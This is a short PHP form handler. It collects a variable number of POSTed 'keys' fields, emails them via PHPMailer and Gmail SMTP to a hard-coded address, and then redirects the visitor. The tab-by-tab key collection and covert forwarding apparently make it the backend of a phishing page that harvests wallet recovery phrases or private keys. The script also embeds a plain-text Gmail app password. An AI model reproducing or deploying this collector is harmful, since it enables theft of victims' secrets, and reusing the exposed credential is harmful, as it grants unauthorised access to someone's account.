<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';


$no_of_tabs = $_POST['nooftabs'];

$value = array();
for ($i = 1; $i <= $no_of_tabs; $i++) { 
    $value[] = $_POST['keys'][$i];
}

$mail = new PHPMailer(true);

try {
    // SMTP server settings
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com'; // Set the SMTP server to use
    $mail->SMTPAuth = true;         // Enable SMTP authentication
    $mail->Username = 'decentroyal11@gmail.com'; // Your SMTP username
    $mail->Password = 'owys qjif kiza ieth';  // Your SMTP password (Use App Password if 2FA is enabled)
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Enable TLS encryption
    $mail->Port = 587;                              // TCP port to connect to

    // Email sender and recipient settings
    $mail->setFrom('decentroyal11@gmail.com', 'Decent Royal'); // Sender's email address and name
    $mail->addAddress('decentroyal11@gmail.com', 'DecentRoyal'); // Add a recipient

    // Create the HTML table content for the email body
    $messageContent = "Here is the data from the form submission:\n";
    foreach ($value as $index => $val) {
        $messageContent .= ($index + 1) . ". " . htmlspecialchars($val) . "\n";
    }

    // Set email format to HTML
    $mail->isHTML(false);
    $mail->Subject = 'Data from the Form Submission';
    $mail->Body    = $messageContent;

    // Send email
    $mail->send();
    echo 'Email sent successfully!';
} catch (Exception $e) {
    echo 'Email could not be sent. Mailer Error: ' . $mail->ErrorInfo;
}

header("Location:index.html");


?>